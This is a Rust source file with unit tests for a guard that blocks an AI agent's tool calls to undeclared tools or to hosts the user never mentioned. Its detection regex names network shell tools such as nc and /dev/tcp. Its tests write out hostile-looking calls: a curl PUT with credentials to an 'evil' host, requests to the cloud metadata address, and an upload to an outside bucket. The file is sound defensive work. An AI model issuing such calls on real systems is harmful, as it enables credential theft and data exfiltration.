//! What a request allows its response to call: only tools it declared, and only hosts the
//! conversation (not the model) brought up. Port of safeagents' `policy.py`.

use std::collections::{BTreeSet, HashSet};
use std::sync::LazyLock;

use regex::Regex;
use serde_json::Value;

/// Hosts that may appear in tool calls even if the conversation never mentions them.
pub const DEFAULT_ALLOWED_HOSTS: &[&str] = &[
    "localhost",
    "127.0.0.1",
    "github.com",
    "githubusercontent.com",
    "pypi.org",
    "pythonhosted.org",
    "huggingface.co",
    "hf.co",
    "npmjs.org",
    "crates.io",
];

/// Domains reserved for examples (RFC 2606): no one can register them.
const RESERVED_HOSTS: &[&str] = &["example.com", "example.net", "example.org"];

// What lets a call reach a host: a network client in a command or in code. A URL anywhere
// else (a CSV row, a log line in a fixture, a docstring) is data the call writes.
static NETWORK: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)\b(?:curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ftp)\s|\bgit\s+(?:clone|fetch|pull|push|ls-remote)\b|\bpip3?\s+install\b|/dev/(?:tcp|udp)/|\brequests\.(?:get|post|put|patch|delete|head|options|request|Session)\b|\burlopen\(|\burllib\.request\b|\bhttpx\.|\baiohttp\.|\bhttp\.client\b|\bsocket\.(?:socket|create_connection)\b|\bfetch\(",
    )
    .unwrap()
});
// Tools that reach a URL by themselves (`web_fetch`, `browser_exec`, ...).
static NETWORK_TOOL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)fetch|browse|browser|web|http|url|download").unwrap());
static AUTHORITY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"://([^\s/?#"'\\`)\]>]*)"#).unwrap());
static HOST: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[a-z0-9.-]*").unwrap());
static IPV4_AT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\d{1,3}(?:\.\d{1,3}){3}").unwrap());
static IPV4_FULL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\d{1,3}(?:\.\d{1,3}){3}$").unwrap());

/// Tool names in the request's `tools`: OpenAI `function.name`, Anthropic `name`.
pub fn declared_tools(request: &Value) -> HashSet<String> {
    let Some(tools) = request.get("tools").and_then(Value::as_array) else { return HashSet::new() };
    tools
        .iter()
        .filter_map(|tool| {
            let tool = tool.as_object()?;
            let name = match tool.get("function") {
                Some(Value::Object(function)) => function.get("name"),
                _ => tool.get("name"),
            };
            name?.as_str().map(str::to_string)
        })
        .collect()
}

/// IPv4 literals in `text`, not preceded by a digit, `.` or `=` (`pkg==0.5.1.4` is a
/// version) and not followed by a digit or `.`.
fn ipv4_literals(text: &str) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut found = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let prev_ok = i == 0 || !(bytes[i - 1].is_ascii_digit() || bytes[i - 1] == b'.' || bytes[i - 1] == b'=');
        if prev_ok
            && bytes[i].is_ascii_digit()
            && let Some(m) = IPV4_AT.find(&text[i..])
        {
            let end = i + m.end();
            let next_ok = end == bytes.len() || !(bytes[end].is_ascii_digit() || bytes[end] == b'.');
            if next_ok {
                found.push(&text[i..end]);
                i = end;
                continue;
            }
        }
        i += 1;
    }
    found
}

/// Lowercased hosts in `text`: the host of `scheme://` URLs and bare IPv4 literals.
pub fn extract_hosts(text: &str) -> Vec<String> {
    let text = text.to_lowercase();
    let mut hosts = BTreeSet::new();
    for authority in AUTHORITY.captures_iter(&text) {
        let host_and_port = authority[1].rsplit('@').next().unwrap_or("");
        let host = HOST.find(host_and_port).map_or("", |m| m.as_str());
        if !host.is_empty() {
            hosts.insert(host.to_string());
        }
    }
    for ip in ipv4_literals(&text) {
        if ip.split('.').all(|octet| octet.parse::<u32>().is_ok_and(|n| n <= 255)) {
            hosts.insert(ip.to_string());
        }
    }
    hosts.into_iter().collect()
}

/// The text a call's raw JSON arguments carry: every string value, decoded, so a command's
/// newlines are real again (matching raw JSON reads an escaped newline before `cat` as `ncat`).
pub fn call_text(args: &str) -> String {
    let Ok(value) = serde_json::from_str::<Value>(args) else { return args.to_string() };
    let mut strings = Vec::new();
    fn walk<'a>(value: &'a Value, out: &mut Vec<&'a str>) {
        match value {
            Value::String(s) => out.push(s),
            Value::Object(map) => map.values().for_each(|v| walk(v, out)),
            Value::Array(items) => items.iter().for_each(|v| walk(v, out)),
            _ => {}
        }
    }
    walk(&value, &mut strings);
    strings.join("\n")
}

pub struct Policy {
    declared: HashSet<String>,
    context: String,
    allowed_hosts: Vec<String>,
}

impl Policy {
    pub fn new(request: &Value, allowed_hosts: &[String]) -> Self {
        // The request without the model's own turns: a host the model wrote earlier is no
        // more sourced than one it writes now.
        let mut context = request.clone();
        if let Some(messages) = context.get_mut("messages").and_then(Value::as_array_mut) {
            messages.retain(|m| m.get("role").and_then(Value::as_str) != Some("assistant"));
        }
        Self {
            declared: declared_tools(request),
            context: crate::compact_json(&context).to_lowercase(),
            allowed_hosts: allowed_hosts
                .iter()
                .map(String::as_str)
                .chain(RESERVED_HOSTS.iter().copied())
                .map(str::to_lowercase)
                .collect(),
        }
    }

    /// Why a call to `name` with raw `args` should be blocked, if it should.
    pub fn check(&self, name: &str, args: &str) -> Option<String> {
        if !self.declared.contains(name) {
            return Some("undeclared tool".into());
        }
        // A host only matters in a call that can reach it.
        let text = call_text(args);
        let network_tool = NETWORK_TOOL.is_match(name);
        if !(network_tool || NETWORK.is_match(&text)) {
            return None;
        }
        // A URL's host counts anywhere in such a call; a bare IP only on a line that reaches out.
        let reaching = if network_tool {
            text.clone()
        } else {
            text.lines().filter(|line| NETWORK.is_match(line)).collect::<Vec<_>>().join("\n")
        };
        let mut hosts: BTreeSet<String> =
            extract_hosts(&text).into_iter().filter(|h| !IPV4_FULL.is_match(h)).collect();
        hosts.extend(extract_hosts(&reaching));
        for host in hosts {
            if self.context.contains(&host) {
                continue;
            }
            if self.allowed_hosts.iter().any(|a| host == *a || host.ends_with(&format!(".{a}"))) {
                continue;
            }
            return Some(format!("host `{host}` appears nowhere in the conversation"));
        }
        None
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use serde_json::json;

    pub(crate) const OSS: &str = "example-bucket.oss-cn-beijing.aliyuncs.com";

    pub(crate) fn bash_request(user: &str) -> Value {
        json!({
            "messages": [{"role": "user", "content": user}],
            "tools": [{"type": "function", "function": {"name": "bash"}}],
        })
    }

    fn default_hosts() -> Vec<String> {
        DEFAULT_ALLOWED_HOSTS.iter().map(|h| h.to_string()).collect()
    }

    fn policy(request: &Value) -> Policy {
        Policy::new(request, &default_hosts())
    }

    #[test]
    fn declared_tools_reads_both_formats() {
        let openai = declared_tools(&json!({"tools": [{"type": "function", "function": {"name": "read_file"}}]}));
        assert_eq!(openai, HashSet::from(["read_file".to_string()]));
        let anthropic = declared_tools(&json!({"tools": [{"name": "get_weather", "input_schema": {}}]}));
        assert_eq!(anthropic, HashSet::from(["get_weather".to_string()]));
    }

    #[test]
    fn extracts_url_hosts_and_bare_ips() {
        let text = r#"{"cmd": "curl -X PUT https://user:pw@Evil.Example.com:8443/x && curl 169.254.169.254/latest; cat file:///etc/hosts"}"#;
        assert_eq!(extract_hosts(text), ["169.254.169.254", "evil.example.com"]);
        assert!(extract_hosts("pip install torch==2.5.1 && ls ./src/main.rs").is_empty());
        assert!(extract_hosts("version 1.2.3.4.5 and 999.1.1.1").is_empty());
    }

    #[test]
    fn declared_tool_with_unseen_host_is_blocked() {
        let p = policy(&bash_request("Write a detection rule for curl downloads to /tmp."));
        let reason = p
            .check("bash", &format!(r#"{{"cmd": "curl -o /tmp/put_probe -X PUT --data-binary PROBE https://{OSS}/probe"}}"#))
            .unwrap();
        assert!(reason.contains(OSS));
        assert!(p.check("bash", r#"{"cmd": "curl http://169.254.169.254/latest/meta-data/"}"#).is_some());
        assert_eq!(p.check("shell", "{}").as_deref(), Some("undeclared tool"));
    }

    #[test]
    fn host_from_user_or_allowlist_is_fine() {
        let p = policy(&bash_request("Download https://data.example.org/file.csv please"));
        assert_eq!(p.check("bash", r#"{"cmd": "curl -O https://data.example.org/file.csv"}"#), None);
        assert_eq!(p.check("bash", r#"{"cmd": "git clone https://github.com/huggingface/transformers"}"#), None);
        assert_eq!(p.check("bash", r#"{"cmd": "curl http://localhost:8080/health"}"#), None);
    }

    #[test]
    fn host_only_in_model_turns_does_not_count() {
        let mut request = bash_request("hi");
        request["messages"].as_array_mut().unwrap().push(json!({"role": "assistant", "content": format!("I will use https://{OSS}")}));
        assert!(policy(&request).check("bash", &format!("curl https://{OSS}/x")).is_some());
    }

    #[test]
    fn host_in_written_data_is_fine() {
        let mut request = bash_request("Write a CLF log parser and a click log generator, with tests.");
        request["tools"].as_array_mut().unwrap().push(json!({"type": "function", "function": {"name": "write"}}));
        let p = policy(&request);
        let line = r#"10.0.0.1 - bob [10/Oct/2000:13:55:36 -0700] \"GET /a HTTP/1.0\" 200 5 \"http://x.com\" \"curl/7.68.0\""#;
        assert_eq!(p.check("write", &format!(r#"{{"path": "test_clf.py", "content": "LINE = \"{line}\""}}"#)), None);
        assert_eq!(p.check("bash", r#"{"command": "printf 'user_000,2026-08-01T00:00:00Z,http://a.com\\n' > clicks.csv"}"#), None);
        assert_eq!(p.check("write", r##"{"content": "# see http://home.online.no/~pjacklam/notes/invnorm/"}"##), None);
        assert_eq!(p.check("bash", r#"{"command": "python3 -m http.server 8080 --bind 0.0.0.0 &"}"#), None);
    }

    #[test]
    fn reserved_hosts_are_fine_and_requests_are_still_checked() {
        let p = Policy::new(&bash_request("hi"), &[]);
        assert_eq!(p.check("bash", r#"{"cmd": "curl https://click.example.com/x https://example.org"}"#), None);
        assert!(p
            .check("bash", r#"{"cmd": "python -c \"import requests; requests.get('https://www.google.com/search?q=task')\""}"#)
            .is_some());
        assert_eq!(
            p.check("web_fetch", r#"{"url": "https://en.wikipedia.org/wiki/Genetic_code"}"#).as_deref(),
            Some("undeclared tool")
        );
        let mut request = bash_request("hi");
        request["tools"].as_array_mut().unwrap().push(json!({"type": "function", "function": {"name": "web_extract"}}));
        assert!(Policy::new(&request, &[]).check("web_extract", r#"{"urls": ["https://fineenvs-rl-explorer.hf.space/t/x"]}"#).is_some());
    }

    #[test]
    fn ips_in_fixtures_beside_a_request_are_fine() {
        let p = policy(&bash_request("Write a log summariser for /app/logs."));
        let fixture = "cat > a.log <<'EOF'\n1.2.3.4 - - [07/Nov/2020:01:30:00 -0700] \"GET /x HTTP/1.0\" 200 1\nEOF\n./summarise a.log";
        assert_eq!(p.check("bash", &json!({"command": fixture}).to_string()), None);
        let with_request = format!("curl -s http://localhost:8080/health\n{fixture}");
        assert_eq!(p.check("bash", &json!({"command": with_request}).to_string()), None);
        assert_eq!(p.check("bash", &json!({"command": "pip install t-digest==0.5.1.4"}).to_string()), None);
        assert!(p.check("bash", &json!({"command": "curl -s http://10.9.8.7/x"}).to_string()).is_some());
        let code = "import urllib.request\nURL = 'https://reveng.online/a.json'";
        assert!(p.check("bash", &json!({"command": code}).to_string()).is_some());
    }
}
